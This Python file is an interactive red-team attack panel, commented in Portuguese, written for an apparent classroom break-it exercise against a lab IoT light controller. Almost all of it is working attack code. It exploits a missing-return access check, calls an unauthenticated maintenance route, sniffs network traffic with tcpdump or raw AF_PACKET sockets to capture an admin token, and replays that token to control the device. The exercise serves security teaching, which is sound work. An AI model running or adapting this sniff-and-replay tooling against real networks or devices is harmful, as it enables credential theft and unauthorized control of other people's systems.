#!/usr/bin/env python3
"""
Painel Interativo de Ataque (Red Team) - Atividade BIBIFI IoT
Demonstração ao vivo das vulnerabilidades baseadas em Fulton et al. (CCS '22):
  1. BREAK 1A: Mistake (falha de fluxo de controle / falta de return)
  2. BREAK 1B: Some Intuitive No Implementation (rota /api/manutencao)
  3. BREAK 2 : Sniffing real na rede (tcpdump / AF_PACKET) + Replay Attack

Uso:
  sudo python3 ataques/painel_ataque_grupo.py
  sudo python3 ataques/painel_ataque_grupo.py http://192.168.4.1
"""

import json
import os
import re
import shutil
import socket
import struct
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request

HOST_PADRAO = "http://192.168.4.1"
LARGURA = 64
USA_COR = sys.stdout.isatty()
TOKEN_CAPTURADO = ""


def cor(texto: str, codigo: str) -> str:
    if not USA_COR:
        return texto
    return f"\033[{codigo}m{texto}\033[0m"


def negrito(t: str) -> str: return cor(t, "1")
def fraco(t: str) -> str:   return cor(t, "2")
def verde(t: str) -> str:   return cor(t, "32")
def amarelo(t: str) -> str: return cor(t, "33")
def ciano(t: str) -> str:   return cor(t, "36")
def vermelho(t: str) -> str: return cor(t, "31")


def linha(char: str = "─") -> str:
    return fraco(char * LARGURA)


def cabecalho_secao(titulo: str) -> None:
    print(f"\n{ciano('▸')} {negrito(titulo)}")


def requisicao_http(url: str) -> tuple[int, str]:
    try:
        with urllib.request.urlopen(url, timeout=4) as resp:
            return resp.getcode(), resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", errors="replace")
    except Exception as e:
        return 0, str(e)


def obter_status(host: str) -> dict:
    codigo, corpo = requisicao_http(f"{host}/status")
    if codigo == 200:
        try:
            return json.loads(corpo)
        except json.JSONDecodeError:
            return {"erro": corpo}
    return {"erro": f"Falha de conexão com {host} (HTTP {codigo}): {corpo}"}


def mostrar_status(host: str) -> dict:
    dados = obter_status(host)
    print(linha())
    if "erro" in dados:
        print(f"  {amarelo('[AVISO]')} {dados['erro']}")
        print(f"  {fraco('Verifique a conexão com o Wi-Fi SmartHome_IoT.')}")
    else:
        acesa = dados.get("luz_acesa")
        estado = verde("ACESA (LED Azul ON)") if acesa else vermelho("APAGADA (LED Azul OFF)")
        print(f"  {fraco('Luz Principal :')} {estado}")
        print(f"  {fraco('Último Evento :')} {dados.get('ultimo_evento') or '-'}")
        if "nonce_atual" in dados:
            print(f"  {fraco('Nonce Atual   :')} {dados.get('nonce_atual')}")
    print(linha())
    return dados


def detectar_interface(ip_alvo: str) -> str:
    """Descobre automaticamente a interface de rede usada para alcançar o alvo."""
    if shutil.which("ip"):
        try:
            res = subprocess.run(
                ["ip", "route", "get", ip_alvo],
                capture_output=True,
                text=True,
                timeout=2,
                check=False,
            )
            match = re.search(r"\bdev\s+(\S+)", res.stdout)
            if match:
                return match.group(1)
        except Exception:
            pass
    return "any"


def extrair_token_de_payload(texto: str) -> tuple[str, str]:
    """Extrai (linha_http, token) de um payload HTTP contendo comando OFF com token."""
    match = re.search(r"(GET\s+/luz\?[^\r\n\s]*)", texto)
    if not match:
        return "", ""
    req_line = match.group(1)
    if "acao=OFF" not in req_line:
        return "", ""
    tok_match = re.search(r"[?&]token=([A-Za-z0-9_-]+)", req_line)
    if not tok_match:
        return "", ""
    return req_line, tok_match.group(1)


def capturar_token_tcpdump(iface: str, ip_alvo: str, porta: int) -> str:
    cmd = [
        "tcpdump", "-i", iface, "-A", "-l", "-nn",
        f"tcp port {porta} and host {ip_alvo}",
    ]
    if os.geteuid() != 0:
        cmd.insert(0, "sudo")

    print(f"  {fraco('Sniffer :')} {' '.join(cmd)}")
    print(f"  {ciano('Aguardando o Admin executar OFF na rede... (Ctrl+C cancela)')}")

    proc = subprocess.Popen(
        cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1,
        errors="replace",
    )
    try:
        assert proc.stdout is not None
        for raw_line in proc.stdout:
            req_line, token = extrair_token_de_payload(raw_line)
            if token:
                print(f"  {verde('[PACOTE CAPTURADO]')} {req_line}")
                return token
    except KeyboardInterrupt:
        print(f"\n  {amarelo('[CANCELADO]')} Captura interrompida.")
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=2)
        except subprocess.TimeoutExpired:
            proc.kill()

    if proc.returncode not in (0, None, -15, 130):
        err = proc.stderr.read().strip() if proc.stderr else ""
        if err:
            print(f"  {amarelo('[AVISO tcpdump]')} {err}")
    return ""


def capturar_token_raw_socket(ip_alvo: str, porta: int) -> str:
    """Fallback em Python puro (Linux AF_PACKET) caso tcpdump não esteja instalado."""
    if os.geteuid() != 0:
        print(f"  {amarelo('[ERRO]')} Sem tcpdump e sem privilégio root para AF_PACKET.")
        print(f"  {fraco('Execute com: sudo python3 ataques/painel_ataque_grupo.py')}")
        return ""

    print(f"  {fraco('Sniffer :')} Linux AF_PACKET (porta {porta}, host {ip_alvo})")
    print(f"  {ciano('Aguardando o Admin executar OFF na rede... (Ctrl+C cancela)')}")

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    try:
        while True:
            raw_data, _ = sock.recvfrom(65535)
            if len(raw_data) < 34:
                continue
            eth_proto = struct.unpack("!H", raw_data[12:14])[0]
            if eth_proto != 0x0800:  # Apenas IPv4
                continue
            ihl = (raw_data[14] & 0x0F) * 4
            proto = raw_data[23]
            if proto != 6:  # Apenas TCP
                continue
            src_ip = socket.inet_ntoa(raw_data[26:30])
            dst_ip = socket.inet_ntoa(raw_data[30:34])
            if ip_alvo not in (src_ip, dst_ip):
                continue
            tcp_start = 14 + ihl
            if len(raw_data) < tcp_start + 20:
                continue
            src_port, dst_port = struct.unpack("!HH", raw_data[tcp_start:tcp_start + 4])
            if porta not in (src_port, dst_port):
                continue
            doff = ((raw_data[tcp_start + 12] >> 4) & 0x0F) * 4
            payload = raw_data[tcp_start + doff:].decode("utf-8", errors="ignore")
            req_line, token = extrair_token_de_payload(payload)
            if token:
                print(f"  {verde('[PACOTE CAPTURADO]')} {req_line}")
                return token
    except KeyboardInterrupt:
        print(f"\n  {amarelo('[CANCELADO]')} Captura interrompida.")
    finally:
        sock.close()
    return ""


def capturar_token_rede(host: str) -> str:
    global TOKEN_CAPTURADO
    parsed = urllib.parse.urlparse(host)
    ip_alvo = parsed.hostname or "192.168.4.1"
    porta = parsed.port or 80
    iface = detectar_interface(ip_alvo)

    if shutil.which("tcpdump"):
        token = capturar_token_tcpdump(iface, ip_alvo, porta)
    else:
        token = capturar_token_raw_socket(ip_alvo, porta)

    if token:
        TOKEN_CAPTURADO = token
    return token


def ataque_break_1a_mistake(host: str) -> bool:
    cabecalho_secao("BREAK 1A — Mistake (Fluxo de Controle em /luz)")
    url = f"{host}/luz?acao=OFF&user=visitante"
    print(f"  {fraco('GET')}  {url}")
    codigo, resp = requisicao_http(url)
    print(f"  {fraco('HTTP')} [{codigo}] {resp}")

    dados = mostrar_status(host)
    if not dados.get("luz_acesa", True) and "erro" not in dados:
        print(f"  {verde('[EXPLORADO]')} Alerta disparado, mas faltou 'return;' após o bloqueio.")
        print(f"  {fraco('Artigo: Mistake (Control Flow Error)')}")
        return True

    print(f"  {amarelo('[BLOQUEADO]')} A rota /luz impediu o desligamento pelo visitante.")
    return False


def ataque_break_1b_rota_esquecida(host: str) -> bool:
    cabecalho_secao("BREAK 1B — No Implementation (Rota /api/manutencao)")
    url = f"{host}/api/manutencao?cmd=apagar_tudo"
    print(f"  {fraco('GET')}  {url}")
    codigo, resp = requisicao_http(url)
    print(f"  {fraco('HTTP')} [{codigo}] {resp}")

    dados = mostrar_status(host)
    if codigo == 200 and not dados.get("luz_acesa", True):
        print(f"  {verde('[EXPLORADO]')} Rota auxiliar executou sem validação de acesso.")
        print(f"  {fraco('Artigo: Some Intuitive No Implementation')}")
        return True

    print(f"  {amarelo('[BLOQUEADO]')} A rota /api/manutencao está protegida.")
    return False


def ataque_break_2_replay(host: str, token_manual: str = "") -> bool:
    global TOKEN_CAPTURADO
    cabecalho_secao("BREAK 2 — Sniffing Real + Replay Attack")

    token = token_manual or TOKEN_CAPTURADO
    if not token:
        token = capturar_token_rede(host)

    if not token:
        print(f"  {amarelo('[SEM TOKEN]')} Nenhum token capturado.")
        return False

    TOKEN_CAPTURADO = token
    print(f"  {fraco('Token   :')} {token}")
    url_replay = f"{host}/luz?acao=OFF&user=admin&token={token}"
    print(f"  {fraco('Replay  :')} {url_replay}")

    codigo, resp = requisicao_http(url_replay)
    print(f"  {fraco('HTTP')}    [{codigo}] {resp}")

    dados_pos = mostrar_status(host)
    if codigo == 200 and not dados_pos.get("luz_acesa", True):
        print(f"  {verde('[EXPLORADO]')} LED Azul apagado via replicação, sem saber a senha!")
        print(f"  {fraco('Artigo: Misunderstanding + Unintuitive No Implementation (sem Nonce)')}")
        return True

    print(f"  {amarelo('[BLOQUEADO]')} Token recusado — controlador protegido com Nonce único.")
    return False


def tratar_opcao_replay(host: str) -> None:
    global TOKEN_CAPTURADO
    if TOKEN_CAPTURADO:
        print(f"\n  {fraco('Token em cache :')} {ciano(TOKEN_CAPTURADO)}")
        acao = input("  [Enter] Replicar | [n] Sniffar novo | [m] Colar manual > ").strip().lower()
        if acao == "n":
            TOKEN_CAPTURADO = ""
            ataque_break_2_replay(host)
        elif acao == "m":
            manual = input("  Cole o token MD5 > ").strip()
            if manual:
                ataque_break_2_replay(host, token_manual=manual)
        else:
            ataque_break_2_replay(host, token_manual=TOKEN_CAPTURADO)
    else:
        token = capturar_token_rede(host)
        if token:
            resp = input("  Token capturado! [Enter] Disparar Replay agora | [g] Só guardar > ").strip().lower()
            if resp != "g":
                ataque_break_2_replay(host, token_manual=token)
        else:
            manual = input("  Deseja colar um token do Wireshark manualmente? (Enter pula) > ").strip()
            if manual:
                ataque_break_2_replay(host, token_manual=manual)


def menu_interativo(host: str) -> None:
    while True:
        print(f"\n{linha('═')}")
        print(f"  {negrito('PAINEL RED TEAM')} {fraco('— BIBIFI IoT (Fulton et al., CCS 22)')}")
        print(f"  {fraco('Alvo  :')} {ciano(host)}")
        cache_str = verde(TOKEN_CAPTURADO) if TOKEN_CAPTURADO else fraco("(nenhum)")
        print(f"  {fraco('Token :')} {cache_str}")
        print(linha('═'))
        print("  [1] Status do controlador (/status)")
        print("  [2] Break 1A — Falha de fluxo em /luz (Mistake)")
        print("  [3] Break 1B — Rota /api/manutencao (No Implementation)")
        print("  [4] Break 2  — Sniffing real + Replay Attack (Apagar luz)")
        print("  [5] Ligar luz novamente (/luz?acao=ON&user=visitante)")
        print("  [0] Sair")
        print(linha())

        try:
            escolha = input("  Opção > ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break

        if escolha == "1":
            mostrar_status(host)
        elif escolha == "2":
            ataque_break_1a_mistake(host)
        elif escolha == "3":
            ataque_break_1b_rota_esquecida(host)
        elif escolha == "4":
            tratar_opcao_replay(host)
        elif escolha == "5":
            requisicao_http(f"{host}/luz?acao=ON&user=visitante")
            mostrar_status(host)
        elif escolha == "0":
            break
        else:
            print(f"  {amarelo('Opção inválida.')}")


if __name__ == "__main__":
    host_alvo = HOST_PADRAO
    for arg in sys.argv[1:]:
        if arg.startswith("http://") or arg.startswith("https://"):
            host_alvo = arg
    menu_interativo(host_alvo)
